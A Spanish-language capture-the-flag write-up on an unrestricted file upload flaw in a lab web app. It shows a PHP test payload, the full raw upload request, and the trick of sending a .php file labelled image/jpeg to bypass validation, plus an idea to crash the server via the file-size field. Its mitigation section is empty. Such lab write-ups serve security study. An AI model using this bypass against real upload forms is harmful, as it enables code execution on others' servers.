# Unrestricted File Upload



## Ataque

- **Localización: /?page=upload**

En la vista tenemos un formulario que nos permite subir imágenes, lo que nos puede proporcionar una superficie de ataque para inyectar código propio y ejecutarlo en el servidor.

Comprobamos primero el formulario en si.

```html
<input type="hidden" name="MAX_FILE_SIZE" value="100000">
```
Lo único interesante que encontramos es un input oculto que sirve para pasar a la petición del formulario el tamaño máximo del archivo. Si no existe validación de este parámetro en el servidor, podemos cargar archivos de gran capacidad, provocando una caída de servidor.

Probamos la validación de tipo de fichero.
Tratamos de subir un script en **php** que consta de una función llamado `malicious_file.php`.
```php
 <?php phpinfo(); ?>
```

Al intentar subir el archivo, vemos que de algún modo valida el fichero y no nos lo permite, pero si cambiamos el nombre del archivo a `malicious_file.jpg`, vemos que nos reporta que se ha subido correctamente y nos proporciona una url para acceder a él.

Hemos podido subir nuestro script, pero al ser un fichero **jpg**, el intérprete de php no nos lo va a ejecutar en el servidor.

Vamos a ver en detalle la petición que se realiza para subir el archivo.

```bash
POST /?page=upload HTTP/1.1
Host: 192.168.222.47
Content-Length: 421
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.222.47
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY6ZlA6O5iyi2PaOF
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.222.47/?page=upload
Accept-Encoding: gzip, deflate, br
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: keep-alive

------WebKitFormBoundaryY6ZlA6O5iyi2PaOF
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryY6ZlA6O5iyi2PaOF
Content-Disposition: form-data; name="uploaded"; filename="malicious_file.jpg"
Content-Type: image/jpeg

<?php phpinfo(); ?>

------WebKitFormBoundaryY6ZlA6O5iyi2PaOF
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryY6ZlA6O5iyi2PaOF--
```

De todos estos parámetros, vemos que el único posible para validar el archivo es que indica el tipo de contenido del archivo, por lo que editamos la petición para que el archivo subido tenga la extensión **php**, pero el tipo de contenido sea **image/jpeg**. 

Posteamos y obtenemos la flag.

## Mitigación

## Referencias